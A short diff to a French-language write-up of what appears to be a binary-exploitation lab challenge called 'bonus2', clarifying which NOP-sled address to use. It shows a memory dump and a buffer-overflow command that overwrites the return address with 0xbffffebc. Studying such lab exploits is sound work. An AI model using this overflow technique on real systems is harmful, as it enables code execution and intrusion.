@@ -180,7 +180,7 @@ Enfin on cherche l'adresse où se trouve l'env afin de changer l'adresse de reto
 0xbfffff09:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
 0xbfffff11:	0x90	0x90	0x90	0x90
 
-puis on prend une adresse environ au milieu et on l'ajoute en little-endian dans le 2eme arg
+puis on prend une adresse environ au milieu et on l'ajoute en little-endian dans le 2eme arg (0xbffffebc qui se situe entre 0xbffffeb9 et 0xbffffec1)
 
 > ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\xbc\xfe\xff\xbf"')
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
